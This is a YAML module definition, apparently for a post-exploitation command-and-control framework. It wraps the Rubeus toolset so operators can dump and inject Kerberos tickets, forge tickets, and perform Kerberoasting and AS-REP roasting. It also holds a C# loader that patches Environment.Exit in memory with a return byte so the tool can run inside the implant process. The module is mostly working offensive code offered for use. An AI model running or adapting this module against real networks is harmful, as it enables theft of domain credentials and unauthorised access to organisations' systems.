name: Rubeus
authors:
  - name: Anthony Rose
    handle: Cx01N
    link: https://twitter.com/Cx01N_
description: |
  This module leverages Rubeus to interact with the LSASS process using
  the LsaCallAuthenticationPackage API, allows for enumeration and manipulation of
  Kerberos tickets without memory dumping. It supports TTPS such as extracting current
  TGTs, injecting forged tickets, Kerberoasting, and conducting AS-REP Roasting.
software: ''
tactics: [TA0006, TA0007]
techniques: [T1482, T1558.001, T1558.002, T1558.003, T1558.004]
background: true
output_extension: ''
needs_admin: false
opsec_safe: true
language: csharp
min_language_version: ''
options:
  - name: Command
    description: Rubeus command to execute.
    required: false
    value: triage
    strict: false
    suggested_values:
      - triage
      - dump
      - asktgt
      - asktgs
      - renew
      - s4u
      - ptt
      - purge
      - describe
      - klist
      - tgtdeleg
      - monitor
      - harvest
      - kerberoast
      - asreproast
      - createnetonly
      - changepw
      - hash
      - tgssub
csharp:
  UnsafeCompile: true
  CompatibleDotNetVersions:
    - Net40
  Code: |
    using System;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Reflection;
    using System.Collections.Generic;
    using System.Security.Cryptography;
    using System.Security.Cryptography.X509Certificates;
    using System.Text.RegularExpressions;
    using System.Linq;
    using System.Text;

    using Asn1 = Rubeus.Asn1;
    using Rubeus.Asn1.Asn1Extensions;
    using Rubeus.lib.crypto;
    using Rubeus;

    public static class Program
    {
        private static byte originalByte;

        public static Stream OutputStream { get; set; }

        public static void Main(string[] args)
        {
            using (StringWriter stringWriter = new StringWriter())
            {
                TextWriter originalOutput = Console.Out;
                TextWriter originalError = Console.Error;

                StreamWriter outputStreamWriter = null;
                if (OutputStream != null)
                {
                    outputStreamWriter = new StreamWriter(OutputStream);
                    outputStreamWriter.AutoFlush = true;
                }

                PatchEnvironmentExit();

                try
                {
                    MultiTextWriter multiWriter = new MultiTextWriter(stringWriter, outputStreamWriter);
                    Console.SetOut(multiWriter);
                    Console.SetError(multiWriter);

                    string command = args[0];
                    string output = Rubeus.Program.MainString(command);
                    Console.WriteLine(output);
                }
                catch (Exception ex)
                {
                    stringWriter.WriteLine($"Error: {ex.Message}");
                    if (ex.InnerException != null)
                    {
                        stringWriter.WriteLine($"Inner Exception: {ex.InnerException.GetType().FullName}: {ex.InnerException.Message}");
                    }
                }
                finally
                {
                    UnpatchEnvironmentExit();

                    Console.SetOut(originalOutput);
                    Console.SetError(originalError);

                    if (outputStreamWriter != null)
                    {
                        outputStreamWriter.Flush();
                        outputStreamWriter.Close();
                    }
                    Console.WriteLine(stringWriter.ToString());
                }
            }
        }

        private static void PatchEnvironmentExit()
        {
            var methods = new List<MethodInfo>(typeof(Environment).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic));
            var exitMethod = methods.Find((MethodInfo mi) => mi.Name == "Exit");

            RuntimeHelpers.PrepareMethod(exitMethod.MethodHandle);
            var exitMethodPtr = exitMethod.MethodHandle.GetFunctionPointer();

            unsafe
            {
                IntPtr target = exitMethod.MethodHandle.GetFunctionPointer();

                MEMORY_BASIC_INFORMATION mbi;

                if (VirtualQueryEx((IntPtr)(-1), target, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                {
                    if (mbi.Protect == (uint)AllocationProtectEnum.PAGE_EXECUTE_READ)
                    {
                        uint flOldProtect;

                        if (VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, (uint)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out flOldProtect))
                        {
                            originalByte = *(byte*)target;
                            *(byte*)target = 0xc3;

                            VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, flOldProtect, out flOldProtect);
                        }
                    }
                }
            }
        }

        private static void UnpatchEnvironmentExit()
        {
            var methods = new List<MethodInfo>(typeof(Environment).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic));
            var exitMethod = methods.Find((MethodInfo mi) => mi.Name == "Exit");

            RuntimeHelpers.PrepareMethod(exitMethod.MethodHandle);
            var exitMethodPtr = exitMethod.MethodHandle.GetFunctionPointer();

            unsafe
            {
                IntPtr target = exitMethod.MethodHandle.GetFunctionPointer();

                MEMORY_BASIC_INFORMATION mbi;

                if (VirtualQueryEx((IntPtr)(-1), target, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                {
                    if (mbi.Protect == (uint)AllocationProtectEnum.PAGE_EXECUTE_READ)
                    {
                        uint flOldProtect;

                        if (VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, (uint)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out flOldProtect))
                        {
                            *(byte*)target = originalByte;

                            VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, flOldProtect, out flOldProtect);
                        }
                    }
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private enum AllocationProtectEnum : uint
        {
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        private class MultiTextWriter : TextWriter
        {
            private readonly TextWriter _writer1;
            private readonly TextWriter _writer2;

            public MultiTextWriter(TextWriter writer1, TextWriter writer2)
            {
                _writer1 = writer1;
                _writer2 = writer2;
            }

            public override Encoding Encoding
            {
                get
                {
                    return _writer1?.Encoding ?? Encoding.UTF8;
                }
            }

            public override void Write(char value)
            {
                _writer1?.Write(value);
                _writer2?.Write(value);
            }

            public override void Write(string value)
            {
                _writer1?.Write(value);
                _writer2?.Write(value);
            }

            public override void Flush()
            {
                _writer1?.Flush();
                _writer2?.Flush();
            }
        }
    }

    namespace Rubeus.Utilities.Memory
    {
        internal class CrossBitnessTypeAttribute : Attribute
        {
            public Type CrossBitnessType { get; }

            private static MethodInfo GetMethodInfo(Type cross_bitness_type)
            {
                return null;
            }

            public CrossBitnessTypeAttribute(Type cross_bitness_type)
            {
            }

            public int GetSize()
            {
                return System.Runtime.InteropServices.Marshal.SizeOf(CrossBitnessType);
            }
        }
    }

    namespace Rubeus
    {
        public static class RubeusExtensions
        {
            public static void SetPinForPrivateKey(this X509Certificate2 certificate, string pin)
            {
                if (certificate == null)
                    throw new ArgumentNullException(nameof(certificate));

                if (certificate.PrivateKey is RSACryptoServiceProvider rsaCsp)
                {
                    var providerHandle = IntPtr.Zero;
                    var pinBuffer = Encoding.ASCII.GetBytes(pin);

                    SafeNativeMethods.Execute(() => SafeNativeMethods.CryptAcquireContext(ref providerHandle,
                                                    rsaCsp.CspKeyContainerInfo.KeyContainerName,
                                                    rsaCsp.CspKeyContainerInfo.ProviderName,
                                                    rsaCsp.CspKeyContainerInfo.ProviderType,
                                                    SafeNativeMethods.CryptContextFlags.Silent));
                    SafeNativeMethods.Execute(() => SafeNativeMethods.CryptSetProvParam(providerHandle,
                                                    SafeNativeMethods.CryptParameter.KeyExchangePin,
                                                    pinBuffer, 0));
                    SafeNativeMethods.Execute(() => SafeNativeMethods.CertSetCertificateContextProperty(
                                                    certificate.Handle,
                                                    SafeNativeMethods.CertificateProperty.CryptoProviderHandle,
                                                    0, providerHandle));
                }
            }
        }
    }
  ReferenceSourceLibraries:
    - Name: Rubeus
      Description: Rubeus is a C# toolset for raw Kerberos interaction and abuses.
      Location: Rubeus\
      Language: CSharp
      CompatibleDotNetVersions:
        - Net40
      ReferenceAssemblies:
        - Name: mscorlib.dll
          Location: net40\mscorlib.dll
          DotNetVersion: Net40
        - Name: System.dll
          Location: net40\System.dll
          DotNetVersion: Net40
        - Name: System.Core.dll
          Location: net40\System.Core.dll
          DotNetVersion: Net40
        - Name: System.Data.dll
          Location: net40\System.Data.dll
          DotNetVersion: Net40
        - Name: System.Data.DataSetExtensions.dll
          Location: net40\System.Data.DataSetExtensions.dll
          DotNetVersion: Net40
        - Name: System.Xml.dll
          Location: net40\System.XML.dll
          DotNetVersion: Net40
        - Name: System.Xml.Linq.dll
          Location: net40\System.Xml.Linq.dll
          DotNetVersion: Net40
        - Name: System.IdentityModel.dll
          Location: net40\System.IdentityModel.dll
          DotNetVersion: Net40
        - Name: System.DirectoryServices.dll
          Location: net40\System.DirectoryServices.dll
          DotNetVersion: Net40
        - Name: System.DirectoryServices.Protocols.dll
          Location: net40\System.DirectoryServices.Protocols.dll
          DotNetVersion: Net40
        - Name: System.DirectoryServices.AccountManagement.dll
          Location: net40\System.DirectoryServices.AccountManagement.dll
          DotNetVersion: Net40
        - Name: System.Security.dll
          Location: net40\System.Security.dll
          DotNetVersion: Net40
        - Name: System.configuration.dll
          Location: net40\System.configuration.dll
          DotNetVersion: Net40
      EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
